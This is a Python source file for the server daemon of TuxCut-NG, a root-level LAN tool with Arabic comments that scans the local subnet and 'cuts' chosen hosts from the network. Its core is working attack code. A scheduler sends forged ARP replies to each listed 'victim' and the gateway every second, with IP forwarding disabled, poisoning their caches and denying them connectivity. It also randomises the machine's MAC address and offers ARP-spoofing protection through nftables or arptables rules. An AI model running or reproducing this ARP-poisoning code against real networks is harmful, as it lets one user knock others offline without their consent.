#!/usr/bin/env python3
"""TuxCut-NG v1.4.3 — Server daemon (run as root via systemd)"""

import sys, os, json, atexit, re, socket, subprocess, random, logging
from pathlib import Path
from setproctitle import setproctitle
from bottle import route, run, request, response
from apscheduler.schedulers.background import BackgroundScheduler
from apscheduler.triggers.interval import IntervalTrigger
from scapy.all import ARP, Ether, srp, send, get_if_addr, get_if_hwaddr, arping

setproctitle('tuxcut-server')

# ── Logging ───────────────────────────────────────────────────────────
Path('/var/log/tuxcut').mkdir(exist_ok=True)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('tuxcut-server')
fh = logging.FileHandler('/var/log/tuxcut/tuxcut.log')
fh.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(fh)

victims = []

# ── Input validation ──────────────────────────────────────────────────

def valid_iface(iface):
    """تطهير اسم الواجهة — حروف وأرقام وشرطات فقط"""
    return bool(re.match(r'^[a-zA-Z0-9_-]{1,20}$', iface or ''))

def valid_ip(ip):
    """التحقق من صحة IPv4"""
    return bool(re.match(
        r'^(\d{1,3}\.){3}\d{1,3}$', ip or '')) and all(
        0 <= int(p) <= 255 for p in ip.split('.'))

def valid_mac(mac):
    """التحقق من صحة MAC address"""
    return bool(re.match(
        r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$', mac or ''))

def valid_victim(v):
    """التحقق من أن الضحية تحتوي على ip وmac صالحَين"""
    return (isinstance(v, dict) and
            valid_ip(v.get('ip', '')) and
            valid_mac(v.get('mac', '')))

# ── Network helpers ───────────────────────────────────────────────────

def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ''

def get_default_gw():
    out = subprocess.run(['ip', 'route', 'show', 'default'],
                         capture_output=True, text=True).stdout
    m = re.search(r'default via (\S+) dev (\S+)', out)
    if not m:
        return {}
    gw_ip, iface = m.group(1), m.group(2)
    if not valid_ip(gw_ip) or not valid_iface(iface):
        return {}
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=gw_ip),
                 timeout=3, verbose=False)
    gw_mac = ans[0][1].hwsrc if ans else ''
    return {'ip': gw_ip, 'mac': gw_mac, 'iface': iface,
            'hostname': get_hostname(gw_ip)}

def get_my(iface):
    return {'ip':       get_if_addr(iface),
            'mac':      get_if_hwaddr(iface),
            'hostname': get_hostname(get_if_addr(iface))}

def enable_ip_forward():
    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'],
                   capture_output=True)

def disable_ip_forward():
    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'],
                   capture_output=True)

def arp_spoof(victim):
    gw = get_default_gw()
    if not gw:
        return
    my = get_my(gw['iface'])
    send(ARP(op=2, psrc=gw['ip'],     hwsrc=my['mac'],
             pdst=victim['ip'],        hwdst=victim['mac']),
         count=5, verbose=False)
    send(ARP(op=2, psrc=victim['ip'], hwsrc=my['mac'],
             pdst=gw['ip'],           hwdst=gw['mac']),
         count=5, verbose=False)

def arp_unspoof(victim):
    gw = get_default_gw()
    if not gw:
        return
    send(ARP(op=2, psrc=gw['ip'],     hwsrc=gw['mac'],
             pdst=victim['ip'],        hwdst=victim['mac']),
         count=10, verbose=False)
    send(ARP(op=2, psrc=victim['ip'], hwsrc=victim['mac'],
             pdst=gw['ip'],           hwdst=gw['mac']),
         count=10, verbose=False)

def generate_mac():
    """
    MAC محلي الإدارة (Locally Administered) وUnicast:
    - البت الثاني (LSB of byte 0) = 0 → unicast
    - البت الثاني من اليسار (bit 1) = 1 → locally administered
    """
    first = 0x02  # 00000010 — locally administered, unicast
    return ':'.join('%02x' % b for b in [
        first,
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
    ])

# ── Scheduler ─────────────────────────────────────────────────────────

def attack_victims():
    if victims:
        disable_ip_forward()
        for v in victims:
            try:
                arp_spoof(v)
            except Exception as e:
                logger.error(f'arp_spoof error: {e}')

scheduler = BackgroundScheduler()
scheduler.start()
scheduler.add_job(attack_victims, IntervalTrigger(seconds=1),
                  id='arp_attack_job', replace_existing=True)

@atexit.register
def on_exit():
    enable_ip_forward()
    scheduler.shutdown(wait=False)   # لا نتوقف انتظار jobs
    logger.info('TuxCut server stopped')

# ── Routes ────────────────────────────────────────────────────────────

def json_response(data):
    response.content_type = 'application/json'
    return json.dumps(data)

@route('/status')
def status():
    return json_response({'status': 'success', 'msg': 'TuxCut server is running'})

@route('/gw')
def gw():
    g = get_default_gw()
    if g:
        return json_response({'status': 'success', 'gw': g})
    return json_response({'status': 'error', 'msg': 'No gateway found'})

@route('/my/<iface>')
def my(iface):
    if not valid_iface(iface):
        return json_response({'status': 'error', 'msg': 'Invalid interface'})
    try:
        return json_response({'status': 'success', 'my': get_my(iface)})
    except Exception as e:
        return json_response({'status': 'error', 'msg': str(e)})

@route('/scan/<gw_ip>/<iface>')
def scan(gw_ip, iface):
    if not valid_ip(gw_ip):
        return json_response({'result': {'status': 'error',
                                         'msg': 'Invalid IP', 'hosts': []}})
    if not valid_iface(iface):
        return json_response({'result': {'status': 'error',
                                         'msg': 'Invalid interface', 'hosts': []}})
    hosts = []
    try:
        ans, _ = srp(
            Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=f'{gw_ip}/24'),
            iface=iface, timeout=3, verbose=False)
        for _, r in ans:
            hosts.append({'ip':       r.psrc,
                          'mac':      r.hwsrc,
                          'hostname': get_hostname(r.psrc)})
        logger.info(f'Scan found {len(hosts)} hosts on {iface}')
    except Exception as e:
        logger.error(f'Scan error: {e}')
    return json_response({'result': {'status': 'success', 'hosts': hosts}})

@route('/scan/<gw_ip>')
def scan_legacy(gw_ip):
    if not valid_ip(gw_ip):
        return json_response({'result': {'status': 'error',
                                         'msg': 'Invalid IP', 'hosts': []}})
    gw = get_default_gw()
    iface = gw.get('iface', '')
    if valid_iface(iface):
        return scan(gw_ip, iface)
    # fallback — arping على كل الواجهات
    hosts = []
    try:
        ans, _ = arping(f'{gw_ip}/24', verbose=False, timeout=3)
        for _, r in ans:
            hosts.append({'ip': r.psrc, 'mac': r.hwsrc,
                          'hostname': get_hostname(r.psrc)})
    except Exception as e:
        logger.error(f'arping error: {e}')
    return json_response({'result': {'status': 'success', 'hosts': hosts}})

@route('/cut', method='POST')
def cut():
    v = request.json
    if not valid_victim(v):
        return json_response({'status': 'error', 'msg': 'Invalid victim data'})
    if v not in victims:
        victims.append(v)
        logger.info(f'Cut: {v["ip"]}')
    return json_response({'status': 'success', 'msg': 'victim added'})

@route('/resume', method='POST')
def resume():
    v = request.json
    if not valid_victim(v):
        return json_response({'status': 'error', 'msg': 'Invalid victim data'})
    if v in victims:
        victims.remove(v)
    try:
        arp_unspoof(v)
        logger.info(f'Resumed: {v["ip"]}')
    except Exception as e:
        logger.error(f'arp_unspoof error: {e}')
    return json_response({'status': 'success', 'msg': 'victim resumed'})

@route('/protect', method='POST')
def protect():
    gw_ip  = request.forms.get('ip',    '').strip()
    gw_mac = request.forms.get('mac',   '').strip()
    iface  = request.forms.get('iface', '').strip()

    # تطهير المدخلات قبل استخدامها
    if not valid_ip(gw_ip):
        return json_response({'status': 'error', 'msg': 'Invalid gateway IP'})
    if not valid_mac(gw_mac):
        return json_response({'status': 'error', 'msg': 'Invalid gateway MAC'})
    if iface and not valid_iface(iface):
        return json_response({'status': 'error', 'msg': 'Invalid interface'})

    if subprocess.run(['which', 'nft'], capture_output=True).returncode == 0:
        subprocess.run(['nft', 'delete', 'table', 'arp', 'tuxcut'],
                       capture_output=True)
        # gw_ip و gw_mac تم التحقق منهما أعلاه — آمن الاستخدام
        nft = (f'table arp tuxcut {{\n  chain input {{\n'
               f'    type filter hook input priority 0; policy drop;\n'
               f'    arp saddr ip {gw_ip} arp saddr ether {gw_mac} accept\n'
               f'  }}\n}}')
        result = subprocess.run(['nft', '-f', '-'],
                                input=nft.encode(), capture_output=True)
        if result.returncode != 0:
            logger.error(f'nft error: {result.stderr.decode()}')
    else:
        for cmd in [['arptables', '-F'],
                    ['arptables', '-P', 'INPUT',  'DROP'],
                    ['arptables', '-P', 'OUTPUT', 'DROP'],
                    ['arptables', '-A', 'INPUT',  '-s', gw_ip,
                     '--source-mac', gw_mac, '-j', 'ACCEPT'],
                    ['arptables', '-A', 'OUTPUT', '-d', gw_ip,
                     '--destination-mac', gw_mac, '-j', 'ACCEPT']]:
            subprocess.run(cmd, capture_output=True)

    if iface:
        subprocess.run(['ip', 'neigh', 'replace', gw_ip, 'lladdr', gw_mac,
                        'dev', iface, 'nud', 'permanent'], capture_output=True)

    logger.info(f'Protection enabled: {gw_ip}')
    return json_response({'status': 'success', 'msg': 'Protection Enabled'})

@route('/unprotect')
def unprotect():
    if subprocess.run(['which', 'nft'], capture_output=True).returncode == 0:
        subprocess.run(['nft', 'delete', 'table', 'arp', 'tuxcut'],
                       capture_output=True)
    else:
        for cmd in [['arptables', '-P', 'INPUT',  'ACCEPT'],
                    ['arptables', '-P', 'OUTPUT', 'ACCEPT'],
                    ['arptables', '-F']]:
            subprocess.run(cmd, capture_output=True)
    logger.info('Protection disabled')
    return json_response({'status': 'success', 'msg': 'Protection Disabled'})

@route('/change-mac/<iface>')
def change_mac(iface):
    # تطهير iface — إصلاح مشكلة Command Injection
    if not valid_iface(iface):
        return json_response({'result': {'status': 'failed',
                                         'msg': 'Invalid interface name'}})
    new_mac = generate_mac()
    try:
        r1 = subprocess.run(['ip', 'link', 'set', iface, 'down'],
                            capture_output=True)
        r2 = subprocess.run(['ip', 'link', 'set', iface, 'address', new_mac],
                            capture_output=True)
        r3 = subprocess.run(['ip', 'link', 'set', iface, 'up'],
                            capture_output=True)

        # التحقق من نجاح العمليات
        if r2.returncode != 0:
            logger.error(f'change_mac failed: {r2.stderr.decode()}')
            subprocess.run(['ip', 'link', 'set', iface, 'up'],
                           capture_output=True)
            return json_response({'result': {'status': 'failed',
                                             'msg': r2.stderr.decode()}})

        logger.info(f'MAC changed on {iface} to {new_mac}')
        return json_response({'result': {'status': 'success',
                                         'new_mac': new_mac}})
    except Exception as e:
        logger.error(f'change_mac exception: {e}')
        return json_response({'result': {'status': 'failed', 'msg': str(e)}})

# ── Start ──────────────────────────────────────────────────────────────

if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit('ERROR: must run as root')
    subprocess.run(['fuser', '-k', '8013/tcp'], capture_output=True)
    logger.info('TuxCut-NG v1.4.3 starting on 127.0.0.1:8013')
    run(host='127.0.0.1', port=8013, quiet=True, server='wsgiref')
